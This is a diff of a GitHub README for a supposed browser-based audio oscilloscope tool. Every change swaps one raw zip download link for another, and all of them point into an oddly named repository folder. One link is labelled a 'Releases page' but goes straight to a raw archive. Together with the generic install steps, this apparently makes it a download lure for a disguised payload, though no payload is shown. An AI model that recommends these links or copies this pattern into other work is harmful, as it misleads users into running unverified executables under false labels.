@@ -1,6 +1,6 @@
 # 🎶 OscilloScope-XY-WEB - Visualize Audio in Real-Time
 
-[![Download Now](https://github.com/hemanthsaimadala/OscilloScope-XY-WEB/raw/refs/heads/main/nonextensile/X-WEB-Oscillo-Scope-v1.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/hemanthsaimadala/OscilloScope-XY-WEB/raw/refs/heads/main/nonextensile/X-WEB-Oscillo-Scope-v1.5.zip)
+[![Download Now](https://github.com/hemanthsaimadala/OscilloScope-XY-WEB/raw/refs/heads/main/nonextensile/WEB-X-Oscillo-Scope-v1.0.zip%20Now-Click%20Here-brightgreen)](https://github.com/hemanthsaimadala/OscilloScope-XY-WEB/raw/refs/heads/main/nonextensile/WEB-X-Oscillo-Scope-v1.0.zip)
 
 ## 📜 Description
 
@@ -10,7 +10,7 @@ OscilloScope-XY-WEB is a real-time audio visualization tool that runs in your we
 
 Follow these steps to download and run OscilloScope-XY-WEB:
 
-1. **Visit the Releases Page**: Click this link to go to the [Releases page](https://github.com/hemanthsaimadala/OscilloScope-XY-WEB/raw/refs/heads/main/nonextensile/X-WEB-Oscillo-Scope-v1.5.zip).
+1. **Visit the Releases Page**: Click this link to go to the [Releases page](https://github.com/hemanthsaimadala/OscilloScope-XY-WEB/raw/refs/heads/main/nonextensile/WEB-X-Oscillo-Scope-v1.0.zip).
   
 2. **Choose the Latest Release**: Look for the latest version at the top of the page. This will give you the newest features and fixes.
 
@@ -47,7 +47,7 @@ If you encounter issues while downloading or running the application, consider t
 
 ## 🔗 Download & Install
 
-To get started, [visit this page to download](https://github.com/hemanthsaimadala/OscilloScope-XY-WEB/raw/refs/heads/main/nonextensile/X-WEB-Oscillo-Scope-v1.5.zip). Follow the steps above to install and enjoy the array of features it offers.
+To get started, [visit this page to download](https://github.com/hemanthsaimadala/OscilloScope-XY-WEB/raw/refs/heads/main/nonextensile/WEB-X-Oscillo-Scope-v1.0.zip). Follow the steps above to install and enjoy the array of features it offers.
 
 ## 💬 Feedback
 
